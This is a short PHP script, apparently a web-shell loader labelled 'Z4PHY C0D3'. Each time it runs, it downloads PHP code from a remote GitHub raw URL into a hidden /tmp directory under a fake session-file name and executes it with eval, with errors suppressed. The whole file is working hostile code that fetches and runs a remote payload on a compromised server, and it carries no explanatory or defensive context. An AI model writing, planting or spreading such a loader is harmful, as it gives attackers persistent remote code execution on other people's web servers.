<?php
// Z4PHY C0D3
$session_dir = "/tmp/.sessions/";
$tmp_dir = "/tmp/";
if (is_dir($session_dir)) {
    $rand = rand(00000000,99999999);
    $md5 = md5($rand);
    if(!is_file($session_dir.'sess_'.$md5)) {
        @file_put_contents($session_dir.'sess_'.$md5, file_get_contents('https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/b3p4s/anu-v2.php'));
    }
    @eval('?>'.file_get_contents($session_dir.'sess_'.$md5));
} else {
    $rand = rand(00000000,99999999);
    $md5 = md5($rand);
    if(!is_file($tmp_dir.'sess_'.$md5)) {
        @file_put_contents($tmp_dir.'sess_'.$md5, file_get_contents('https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/b3p4s/anu-v2.php'));
    }
    @eval('?>'.file_get_contents($tmp_dir.'sess_'.$md5));
}